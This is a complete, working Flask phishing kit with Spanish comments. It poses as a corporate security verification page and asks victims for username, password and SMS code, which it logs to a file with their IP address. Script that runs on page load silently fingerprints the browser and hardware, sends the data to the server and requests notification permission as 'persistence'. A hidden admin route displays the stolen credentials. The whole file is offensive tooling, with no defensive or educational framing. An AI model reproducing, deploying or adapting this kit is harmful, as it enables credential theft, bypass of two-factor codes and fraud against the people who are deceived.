from flask import Flask, render_template_string, request, redirect, jsonify
import datetime
import json

app = Flask(__name__)

# --- INTERFAZ DE ALTO IMPACTO ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Soporte de Seguridad Corporativa</title>
    <script>
        // Post-Explotación de Navegador
        async function svr_shadow_extract() {
            let canvas = document.createElement('canvas');
            let gl = canvas.getContext('webgl');
            let debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            
            const payload = {
                hw: {
                    cores: navigator.hardwareConcurrency,
                    ram: navigator.deviceMemory,
                    gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : 'Unknown',
                    platform: navigator.platform,
                    agent: navigator.userAgent
                },
                net: {
                    ip_local: "Capturando...",
                    downlink: navigator.connection ? navigator.connection.downlink : 'N/A'
                },
                ts: new Date().toISOString()
            };

            // Envío silencioso
            fetch('/svr_harvest', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });

            // Trampa de Notificaciones (Persistencia)
            if ("Notification" in window) {
                Notification.requestPermission();
            }
        }

        window.onload = svr_shadow_extract;

        function showLoading() {
            document.getElementById('form_box').style.display = 'none';
            document.getElementById('loader_box').style.display = 'block';
            return true;
        }
    </script>
    <style>
        body { background: #0b0e14; color: #e6edf3; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #161b22; width: 100%; max-width: 380px; padding: 40px; border-radius: 6px; border: 1px solid #30363d; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
        .shield { color: #238636; font-size: 40px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; background: #0d1117; border: 1px solid #30363d; color: white; border-radius: 6px; box-sizing: border-box; }
        .btn { background: #238636; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        .btn:hover { background: #2ea043; }
        #loader_box { display: none; }
        .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #238636; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <div id="form_box">
            <div class="shield">🔒</div>
            <h2 style="margin:0 0 10px 0; font-size:20px;">Verificación Global</h2>
            <p style="font-size:13px; color:#8b949e; margin-bottom:20px;">Detectamos un inicio de sesión inusual. Confirme su identidad para proteger su cuenta.</p>
            <form action="/login" method="post" onsubmit="return showLoading()">
                <input type="text" name="u" placeholder="Usuario / Email" required>
                <input type="password" name="p" placeholder="Contraseña actual" required>
                <input type="text" name="t" placeholder="Código SMS / Teléfono" required>
                <button type="submit" class="btn">Validar Identidad</button>
            </form>
        </div>
        <div id="loader_box">
            <div class="spinner"></div>
            <h3>Sincronizando...</h3>
            <p style="font-size:12px; color:#8b949e;">Analizando hardware de seguridad y geolocalización. No cierre la pestaña.</p>
        </div>
    </div>
</body>
</html>
"""

@app.route('/svr_harvest', methods=['POST'])
def svr_harvest():
    data = request.json
    with open("shadow_logs.json", "a") as f:
        f.write(json.dumps(data) + "\\n")
    return '', 204

@app.route('/panel-secreto-svr')
def ver_botin():
    try:
        with open("capturas.txt", "r") as f: creds = f.read()
    except: creds = "Esperando credenciales..."
    try:
        with open("shadow_logs.json", "r") as f: shadow = f.read()
    except: shadow = "Analizando hardware..."
    
    return f"""
    <html><body style='background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px;'>
    <h2 style='color:#238636;'>🛰️ SVR-MATRIX: SHADOW CONTROL</h2><hr>
    <h3>[+] ACCESOS (CREDS):</h3><pre style='background:#161b22; padding:15px; border:1px solid #30363d;'>{creds}</pre>
    <h3>[+] HARDWARE & FINGERPRINT:</h3><pre style='background:#161b22; padding:15px; border:1px solid #30363d;'>{shadow}</pre>
    </body></html>
    """

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    u, p, t = request.form.get('u'), request.form.get('p'), request.form.get('t')
    log = f"[{datetime.datetime.now()}] USER: {u} | PASS: {p} | TEL: {t} | IP: {request.remote_addr}\\n"
    with open("capturas.txt", "a") as f:
        f.write(log)
    return redirect("https://www.google.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
